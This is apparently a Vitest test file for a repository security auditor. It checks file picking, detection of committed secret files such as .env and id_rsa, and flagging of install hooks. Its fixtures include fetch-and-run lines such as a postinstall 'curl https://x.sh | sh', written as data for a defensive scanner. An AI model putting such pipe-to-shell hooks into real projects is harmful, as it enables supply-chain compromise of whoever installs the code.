import { describe, expect, it } from "vitest";
import { auditFiles, codePoints, pickFiles, secretFilePaths } from "../src/repo-audit";

const blob = (path: string, size = 100) => ({ path, type: "blob", size });

describe("repo-audit", () => {
  it("skips vendored, minified and oversized files and ranks install files first", () => {
    const r = pickFiles([blob("node_modules/a/i.js"), blob("src/deep/a/b.ts"), blob("package.json"), blob("big.js", 500_000), blob("x.min.js"), blob(".github/workflows/ci.yml"), blob("README.md")]);
    expect(r.picked[0]).toBe("package.json");
    expect(r.picked).toContain(".github/workflows/ci.yml");
    expect(r.picked).not.toContain("node_modules/a/i.js");
    expect(r.picked).not.toContain("big.js");
    expect(r.picked).not.toContain("x.min.js");
    expect(r.skippedLarge).toBe(1);
  });
  it("caps the number of files", () => {
    const tree = Array.from({ length: 200 }, (_, i) => blob(`src/f${i}.ts`, 100));
    expect(pickFiles(tree).picked.length).toBe(40);
  });
  it("finds committed secret files but not example env files", () => {
    expect(secretFilePaths([blob(".env"), blob("config/.env.production"), blob(".env.example"), blob("keys/id_rsa"), blob("server.pem"), blob("src/a.ts")])).toEqual([".env", "config/.env.production", "keys/id_rsa", "server.pem"]);
  });
  it("flags install hooks that download code, and plain hooks as medium", () => {
    const f = auditFiles([{ path: "package.json", text: '{\n"scripts":{"postinstall":"curl https://x.sh | sh","preinstall":"node setup.js","test":"vitest"}}' }]);
    expect(f.find((x) => x.rule === "install-hook-remote")?.severity).toBe("high");
    expect(f.find((x) => x.rule === "install-hook")?.severity).toBe("medium");
    expect(f.some((x) => x.excerpt.startsWith("test"))).toBe(false);
  });
  it("survives invalid package.json and clean code", () => {
    expect(auditFiles([{ path: "package.json", text: "{nope" }, { path: "a.ts", text: "export const x = 1;" }])).toEqual([]);
  });
  it("scores: each rule once per file, capped, secret files cost points", () => {
    const f = auditFiles([{ path: "a.sh", text: "curl a | sh\ncurl b | sh\ncurl c | sh" }]);
    expect(codePoints(f, [])).toBe(-15);
    const many = Array.from({ length: 10 }, (_, i) => ({ path: `f${i}.sh`, text: "curl a | sh" }));
    expect(codePoints(auditFiles(many), [])).toBe(-60);
    expect(codePoints([], [".env"])).toBe(-15);
    expect(codePoints([], [])).toBe(0);
  });
});
